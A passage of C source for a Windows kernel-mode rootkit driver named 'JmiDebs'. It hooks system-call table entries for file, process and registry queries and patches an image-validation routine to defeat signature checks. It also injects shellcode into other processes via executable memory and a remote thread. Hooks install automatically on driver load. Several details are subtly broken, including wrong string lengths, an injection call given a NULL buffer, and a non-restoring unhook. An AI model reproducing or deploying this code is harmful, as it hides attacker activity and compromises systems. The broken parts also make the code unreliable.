        !g_pDeviceExtension->pZwQueryInformationProcess) {
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_InstallHooks(VOID) {
    NTSTATUS status;
    PVOID pFunc;
    KIRQL oldIrql;
    if (!g_pDeviceExtension) return STATUS_UNSUCCESSFUL;
    if (g_pDeviceExtension->bHooksInstalled) {
        return STATUS_SUCCESS;
    }
    status = JmiDebs_GetSSDT();
    if (!NT_SUCCESS(status)) {
        return status;
    }
    JmiDebs_InitSSDTIndices();
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtQueryDirectoryFile", .Length = 40, .MaximumLength = 40});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtQueryDirectoryFile = (PFN_NtQueryDirectoryFile)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtQuerySystemInformation", .Length = 46, .MaximumLength = 46});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtQuerySystemInformation = (PFN_NtQuerySystemInformation)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtEnumerateKey", .Length = 28, .MaximumLength = 28});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtEnumerateKey = (PFN_NtEnumerateKey)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtQueryValueKey", .Length = 30, .MaximumLength = 30});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtQueryValueKey = (PFN_NtQueryValueKey)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtOpenProcess", .Length = 26, .MaximumLength = 26});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtOpenProcess = (PFN_NtOpenProcess)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtCreateFile", .Length = 26, .MaximumLength = 26});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtCreateFile = (PFN_NtCreateFile)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"SeValidateImageHeader", .Length = 40, .MaximumLength = 40});
    if (pFunc) {
        g_pDeviceExtension->pOriginalSeValidateImageHeader = (PFN_SeValidateImageHeader)pFunc;
    }
    if (!g_pDeviceExtension->pOriginalNtQueryDirectoryFile ||
        !g_pDeviceExtension->pOriginalNtQuerySystemInformation ||
        !g_pDeviceExtension->pOriginalNtEnumerateKey ||
        !g_pDeviceExtension->pOriginalNtQueryValueKey ||
        !g_pDeviceExtension->pOriginalNtOpenProcess ||
        !g_pDeviceExtension->pOriginalNtCreateFile) {
        return STATUS_UNSUCCESSFUL;
    }
    status = JmiDebs_GetNtImports();
    if (!NT_SUCCESS(status)) {
        return status;
    }
    oldIrql = KeRaiseIrqlToDpcLevel();
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryDirectoryFile] = (PVOID)JmiDebs_Hook_NtQueryDirectoryFile;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQuerySystemInformation] = (PVOID)JmiDebs_Hook_NtQuerySystemInformation;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtEnumerateKey] = (PVOID)JmiDebs_Hook_NtEnumerateKey;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryValueKey] = (PVOID)JmiDebs_Hook_NtQueryValueKey;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtOpenProcess] = (PVOID)JmiDebs_Hook_NtOpenProcess;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtCreateFile] = (PVOID)JmiDebs_Hook_NtCreateFile;
    KeLowerIrql(oldIrql);
    if (g_pDeviceExtension->pOriginalSeValidateImageHeader) {
        oldIrql = KeRaiseIrqlToDpcLevel();
        *(PVOID*)g_pDeviceExtension->pOriginalSeValidateImageHeader = (PVOID)JmiDebs_Hook_SeValidateImageHeader;
        KeLowerIrql(oldIrql);
    }
    g_pDeviceExtension->bHooksInstalled = TRUE;
    g_pDeviceExtension->ulInfoCount++;
    return STATUS_SUCCESS;
}

static VOID JmiDebs_UninstallHooks(VOID) {
    KIRQL oldIrql;
    if (!g_pDeviceExtension || !g_pDeviceExtension->bHooksInstalled || !g_pDeviceExtension->pServiceDescriptorTable) {
        return;
    }
    oldIrql = KeRaiseIrqlToDpcLevel();
    if (g_pDeviceExtension->pOriginalNtQueryDirectoryFile) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryDirectoryFile] = (PVOID)g_pDeviceExtension->pOriginalNtQueryDirectoryFile;
    }
    if (g_pDeviceExtension->pOriginalNtQuerySystemInformation) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQuerySystemInformation] = (PVOID)g_pDeviceExtension->pOriginalNtQuerySystemInformation;
    }
    if (g_pDeviceExtension->pOriginalNtEnumerateKey) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtEnumerateKey] = (PVOID)g_pDeviceExtension->pOriginalNtEnumerateKey;
    }
    if (g_pDeviceExtension->pOriginalNtQueryValueKey) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryValueKey] = (PVOID)g_pDeviceExtension->pOriginalNtQueryValueKey;
    }
    if (g_pDeviceExtension->pOriginalNtOpenProcess) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtOpenProcess] = (PVOID)g_pDeviceExtension->pOriginalNtOpenProcess;
    }
    if (g_pDeviceExtension->pOriginalNtCreateFile) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtCreateFile] = (PVOID)g_pDeviceExtension->pOriginalNtCreateFile;
    }
    if (g_pDeviceExtension->pOriginalSeValidateImageHeader) {
        *(PVOID*)g_pDeviceExtension->pOriginalSeValidateImageHeader = (PVOID)g_pDeviceExtension->pOriginalSeValidateImageHeader;
    }
    KeLowerIrql(oldIrql);
    g_pDeviceExtension->bHooksInstalled = FALSE;
    g_pDeviceExtension->ulInfoCount++;
}

static NTSTATUS JmiDebs_InjectIntoProcess(HANDLE ProcessId, PVOID pBuffer, SIZE_T BufferSize) {
    NTSTATUS status;
    HANDLE hProcess;
    PEPROCESS pProcess;
    PVOID pAllocAddress;
    SIZE_T RegionSize;
    ULONG OldProtect;
    if (!g_pDeviceExtension || !ProcessId || !pBuffer || BufferSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    status = PsLookupProcessByProcessId(ProcessId, &pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    status = ObOpenObjectByPointer(pProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &hProcess);
    ObDereferenceObject(pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    pAllocAddress = NULL;
    RegionSize = BufferSize;
    status = g_pDeviceExtension->pZwAllocateVirtualMemory(
        hProcess,
        &pAllocAddress,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwWriteVirtualMemory(
        hProcess,
        pAllocAddress,
        pBuffer,
        BufferSize,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwProtectVirtualMemory(
        hProcess,
        &pAllocAddress,
        &RegionSize,
        PAGE_EXECUTE_READWRITE,
        &OldProtect
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    ZwClose(hProcess);
    g_pDeviceExtension->ulProcessInjectionCount++;
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_InjectShellcode(HANDLE ProcessId, PVOID pShellcode, SIZE_T ShellcodeSize) {
    NTSTATUS status;
    HANDLE hProcess;
    PEPROCESS pProcess;
    PVOID pAllocAddress;
    SIZE_T RegionSize;
    ULONG OldProtect;
    HANDLE hThread;
    if (!g_pDeviceExtension || !ProcessId || !pShellcode || ShellcodeSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    status = PsLookupProcessByProcessId(ProcessId, &pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    status = ObOpenObjectByPointer(pProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &hProcess);
    ObDereferenceObject(pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    pAllocAddress = NULL;
    RegionSize = ShellcodeSize;
    status = g_pDeviceExtension->pZwAllocateVirtualMemory(
        hProcess,
        &pAllocAddress,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwWriteVirtualMemory(
        hProcess,
        pAllocAddress,
        pShellcode,
        ShellcodeSize,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwProtectVirtualMemory(
        hProcess,
        &pAllocAddress,
        &RegionSize,
        PAGE_EXECUTE_READWRITE,
        &OldProtect
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        pAllocAddress,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );
    if (NT_SUCCESS(status)) {
        ZwClose(hThread);
        g_pDeviceExtension->ulProcessInjectionCount++;
    }
    ZwClose(hProcess);
    return status;
}

static NTSTATUS JmiDebs_DeviceControl(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    PIO_STACK_LOCATION pStack;
    NTSTATUS status;
    ULONG ulIoControlCode;
    PVOID pInputBuffer;
    PVOID pOutputBuffer;
    ULONG ulInputBufferLength;
    ULONG ulOutputBufferLength;
    if (!pDeviceObject || !pIrp) {
        return STATUS_INVALID_PARAMETER;
    }
    pStack = IoGetCurrentIrpStackLocation(pIrp);
    ulIoControlCode = pStack->Parameters.DeviceIoControl.IoControlCode;
    pInputBuffer = pIrp->AssociatedIrp.SystemBuffer;
    pOutputBuffer = pIrp->AssociatedIrp.SystemBuffer;
    ulInputBufferLength = pStack->Parameters.DeviceIoControl.InputBufferLength;
    ulOutputBufferLength = pStack->Parameters.DeviceIoControl.OutputBufferLength;
    status = STATUS_SUCCESS;
    if (!g_pDeviceExtension) {
        status = STATUS_UNSUCCESSFUL;
        goto CompleteRequest;
    }
    g_pDeviceExtension->ulIoControlCount++;
    switch (ulIoControlCode) {
        case JMIDEBS_IOCTL_INSTALL_HOOKS:
            status = JmiDebs_InstallHooks();
            break;
        case JMIDEBS_IOCTL_UNINSTALL_HOOKS:
            JmiDebs_UninstallHooks();
            status = STATUS_SUCCESS;
            break;
        case JMIDEBS_IOCTL_HIDE_PROCESS:
            if (pInputBuffer && ulInputBufferLength >= sizeof(HANDLE)) {
                HANDLE ProcessId = *(PHANDLE)pInputBuffer;
                status = JmiDebs_InjectIntoProcess(ProcessId, NULL, 0);
            } else {
                status = STATUS_INVALID_PARAMETER;
            }
            break;
        case JMIDEBS_IOCTL_GET_STATUS:
            if (pOutputBuffer && ulOutputBufferLength >= sizeof(ULONG)) {
                *(PULONG)pOutputBuffer = g_pDeviceExtension->bHooksInstalled ? 1 : 0;
                status = STATUS_SUCCESS;
            } else {
                status = STATUS_BUFFER_TOO_SMALL;
            }
            break;
        default:
            status = STATUS_INVALID_PARAMETER;
            break;
    }
CompleteRequest:
    pIrp->IoStatus.Status = status;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return status;
}

static NTSTATUS JmiDebs_DispatchCreate(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_DispatchClose(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_DispatchReadWrite(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_CreateDevice(
    PDRIVER_OBJECT pDriverObject,
    PJMIDEBS_DEVICE_EXTENSION pDeviceExtension
) {
    NTSTATUS status;
    UNICODE_STRING ustrDeviceName;
    UNICODE_STRING ustrSymbolicName;
    PDEVICE_OBJECT pDeviceObject;
    if (!pDriverObject || !pDeviceExtension) {
        return STATUS_INVALID_PARAMETER;
    }
    RtlInitUnicodeString(&ustrDeviceName, JMIDEBS_DEVICE_NAME);
    RtlInitUnicodeString(&ustrSymbolicName, JMIDEBS_SYMLINK_NAME);
    status = IoCreateDevice(
        pDriverObject,
        sizeof(JMIDEBS_DEVICE_EXTENSION),
        &ustrDeviceName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &pDeviceObject
    );
    if (!NT_SUCCESS(status)) {
        return status;
    }
    pDeviceObject->Flags |= DO_BUFFERED_IO;
    pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
    status = IoCreateSymbolicLink(&ustrSymbolicName, &ustrDeviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(pDeviceObject);
        return status;
    }
    pDeviceExtension->pDeviceObject = pDeviceObject;
    pDeviceExtension->bInitialized = TRUE;
    return STATUS_SUCCESS;
}

static VOID JmiDebs_DeleteDevice(
    PDRIVER_OBJECT pDriverObject
) {
    UNICODE_STRING ustrSymbolicName;
    if (!pDriverObject) return;
    RtlInitUnicodeString(&ustrSymbolicName, JMIDEBS_SYMLINK_NAME);
    IoDeleteSymbolicLink(&ustrSymbolicName);
    if (pDriverObject->DeviceObject) {
        IoDeleteDevice(pDriverObject->DeviceObject);
    }
}

static VOID JmiDebs_Unload(
    PDRIVER_OBJECT pDriverObject
) {
    if (!pDriverObject) return;
    if (g_pDeviceExtension) {
        JmiDebs_UninstallHooks();
        KeSetEvent(&g_pDeviceExtension->UnloadEvent, IO_NO_INCREMENT, FALSE);
    }
    JmiDebs_DeleteDevice(pDriverObject);
    if (g_pDeviceExtension) {
        ExFreePoolWithTag(g_pDeviceExtension, JMIDEBS_POOL_TAG);
        g_pDeviceExtension = NULL;
    }
    g_pDriverObject = NULL;
}

static NTSTATUS JmiDebs_DriverEntry(
    PDRIVER_OBJECT pDriverObject,
    PUNICODE_STRING pRegistryPath
) {
    NTSTATUS status;
    ULONG i;
    if (!pDriverObject || !pRegistryPath) {
        return STATUS_INVALID_PARAMETER;
    }
    g_pDriverObject = pDriverObject;
    g_pDeviceExtension = (PJMIDEBS_DEVICE_EXTENSION)ExAllocatePoolWithTag(
        NonPagedPool,
        sizeof(JMIDEBS_DEVICE_EXTENSION),
        JMIDEBS_POOL_TAG
    );
    if (!g_pDeviceExtension) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory(g_pDeviceExtension, sizeof(JMIDEBS_DEVICE_EXTENSION));
    status = JmiDebs_CreateDevice(pDriverObject, g_pDeviceExtension);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(g_pDeviceExtension, JMIDEBS_POOL_TAG);
        g_pDeviceExtension = NULL;
        return status;
    }
    KeInitializeSpinLock(&g_pDeviceExtension->SpinLock);
    KeInitializeEvent(&g_pDeviceExtension->LoadEvent, NotificationEvent, FALSE);
    KeInitializeEvent(&g_pDeviceExtension->UnloadEvent, NotificationEvent, FALSE);
    JmiDebs_InitHiddenLists();
    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        pDriverObject->MajorFunction[i] = JmiDebs_DispatchReadWrite;
    }
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = JmiDebs_DispatchCreate;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = JmiDebs_DispatchClose;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = JmiDebs_DeviceControl;
    pDriverObject->DriverUnload = JmiDebs_Unload;
    status = JmiDebs_InstallHooks();
    if (!NT_SUCCESS(status)) {
        JmiDebs_Unload(pDriverObject);
        return status;
    }
    g_pDeviceExtension->ulInfoCount++;
    KeSetEvent(&g_pDeviceExtension->LoadEvent, IO_NO_INCREMENT, FALSE);
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(
    PDRIVER_OBJECT pDriverObject,
    PUNICODE_STRING pRegistryPath
) {
    return JmiDebs_DriverEntry(pDriverObject, pRegistryPath);
}
